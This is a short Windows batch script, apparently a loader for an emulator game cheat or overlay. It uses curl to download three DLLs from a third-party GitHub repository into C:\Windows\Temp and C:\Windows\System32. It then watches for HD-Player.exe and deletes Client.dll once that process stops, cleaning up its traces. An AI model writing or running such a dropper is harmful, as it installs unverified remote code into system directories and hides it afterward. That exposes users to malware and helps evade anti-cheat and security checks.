@echo off
:: Batch script to monitor HD-Player.exe and delete Client.dll when it stops

:: Define paths and URLs
set "temp_path=C:\Windows\Temp\Client.dll"
set "temp_url=https://raw.githubusercontent.com/Sniffer-Lexel/ChustiRaand/b298c20d75337de9b02e9046403443557c37c0ed/Client.dll"

set "aobst_path=C:\Windows\System32\AotBst.dll"
set "aobst_url=https://raw.githubusercontent.com/Sniffer-Lexel/ChustiRaand/b298c20d75337de9b02e9046403443557c37c0ed/AotBst.dll"

set "cimgui_path=C:\Windows\System32\cimgui.dll"
set "cimgui_url=https://raw.githubusercontent.com/Sniffer-Lexel/ChustiRaand/b298c20d75337de9b02e9046403443557c37c0ed/cimgui.dll"

:: Download files using curl
curl -o "%temp_path%" "%temp_url%"
curl -o "%aobst_path%" "%aobst_url%"
curl -o "%cimgui_path%" "%cimgui_url%"

:: Monitor HD-Player.exe and delete Client.dll when it stops
:MonitorLoop
tasklist | find /i "HD-Player.exe" >nul
if %errorlevel%==1 (
    del "%temp_path%"
    goto End
)
timeout /t 5 >nul
goto MonitorLoop

:End
exit
 